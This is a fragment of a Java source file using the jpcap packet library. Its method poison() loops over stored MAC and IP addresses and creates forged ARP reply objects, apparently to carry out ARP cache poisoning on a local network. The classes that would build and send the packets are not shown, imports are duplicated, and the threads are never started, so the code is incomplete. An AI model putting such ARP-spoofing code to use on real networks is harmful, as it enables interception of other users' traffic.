import jpcap.JpcapCaptor;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
import jpcap.NetworkInterface;
import jpcap.packet.Packet;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
public class th_arp {

  public static  void poison()
{
NetworkInterface[] dev= JpcapCaptor.getDeviceList();
String ch_mac=new String();


for(int c=0;c<tab_mac.i_mac;c++)
{
ch_mac=tab_mac.tab_mac[c].toString();

reply th1=new reply(ch_mac,tab_mac.tab_ip[c],1,dev[0]);

reply th2=new reply(ch_mac,tab_mac.tab_ip[c],2,dev[0]);

}

}
}